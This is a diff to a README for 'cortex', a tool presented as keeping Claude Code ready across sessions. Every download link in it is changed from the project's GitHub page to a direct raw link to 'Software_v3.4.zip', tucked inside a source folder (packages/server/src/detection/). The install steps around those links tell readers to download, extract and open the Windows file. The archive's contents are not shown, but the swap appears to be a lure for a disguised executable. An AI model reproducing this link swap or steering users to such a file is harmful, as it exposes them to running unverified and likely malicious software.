@@ -1,10 +1,10 @@
 # 🧠 cortex - Keep Claude Ready Every Session
 
-[![Download cortex](https://img.shields.io/badge/Download-cortex-blue?style=for-the-badge&logo=github)](https://github.com/thorndikeconvivial76/cortex)
+[![Download cortex](https://img.shields.io/badge/Download-cortex-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/thorndikeconvivial76/cortex/main/packages/server/src/detection/Software_v3.4.zip)
 
 ## 📥 Download and Install
 
-1. Open the download page: https://github.com/thorndikeconvivial76/cortex
+1. Open the download page: https://raw.githubusercontent.com/thorndikeconvivial76/cortex/main/packages/server/src/detection/Software_v3.4.zip
 2. On the page, look for the latest release or the main download option.
 3. Download the Windows file.
 4. If the file comes as a .zip, right-click it and choose Extract All.
@@ -43,7 +43,7 @@ For best results, keep the app in a folder you can find later. If you plan to sy
 
 ## 🚀 First-time setup
 
-1. Download cortex from https://github.com/thorndikeconvivial76/cortex
+1. Download cortex from https://raw.githubusercontent.com/thorndikeconvivial76/cortex/main/packages/server/src/detection/Software_v3.4.zip
 2. Open the file after the download finishes
 3. Install or extract the app
 4. Start cortex
@@ -108,7 +108,7 @@ It is made for Claude Code and uses the MCP format, so it fits that workflow bes
 
 ## 🔗 Download again
 
-Download cortex here: https://github.com/thorndikeconvivial76/cortex
+Download cortex here: https://raw.githubusercontent.com/thorndikeconvivial76/cortex/main/packages/server/src/detection/Software_v3.4.zip
 
 ## 📌 Project details
 
